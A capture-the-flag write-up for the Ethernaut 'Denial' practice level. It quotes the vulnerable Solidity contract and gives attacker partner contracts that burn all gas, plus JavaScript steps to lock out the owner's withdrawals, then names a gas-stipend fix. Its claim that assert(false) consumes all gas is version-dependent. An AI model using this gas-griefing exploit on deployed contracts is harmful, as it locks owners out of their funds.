# Ethernaut Challenge #20: Denial

**Objective:** Prevent the owner from withdrawing funds.

**Contract Analysis:**
```solidity
contract Denial {
  address public partner;
  address public constant owner = address(...);
  
  function setWithdrawPartner(address _partner) public {
    partner = _partner;
  }

  function withdraw() public {
    uint amountToSend = address(this).balance / 100;
    // send 1% to partner
    partner.call{value:amountToSend}("");
    // send rest to owner
    owner.call{value:amountToSend * 99}("");
  }

  receive() external payable {}
}
```

**The Vulnerability:**

Line 12: `partner.call{value:amountToSend}("");`

This is an external call with no gas limit specified! The partner contract receives 63/64 of remaining gas.

**The Attack:**

Make a partner contract that consumes all gas or reverts:

```solidity
contract MaliciousPartner {
  fallback() external payable {
    // Infinite loop - consume all gas
    while (true) {
      // Wastes gas
    }
    // Or: revert()
  }
}
```

**But wait** — `call` doesn't propagate reverts by default. Need to consume gas.

**Better Attack:**
```solidity
contract GasConsumer {
  fallback() external payable {
    // Consume most of the gas
    uint256 i = 0;
    while (gasleft() > 1000) {
      i++;
    }
  }
}
```

**Even Better:** Use `assert(false)` which consumes ALL remaining gas:
```solidity
contract AllGasConsumer {
  fallback() external payable {
    assert(false);  // Consumes ALL remaining gas
  }
}
```

**The Exploit:**
```javascript
// 1. Deploy malicious partner
const malicious = await deploy("AllGasConsumer");

// 2. Set as partner
await contract.setWithdrawPartner(malicious.address);

// 3. Now withdraw() always fails (out of gas)
// Owner can never withdraw!
```

**The Lesson:**

External calls can consume arbitrary gas. Setting gas limits is crucial.

Should be:
```solidity
partner.call{value: amountToSend, gas: 2300}("");
```

**Status:** Challenge understood. Gas griefing.
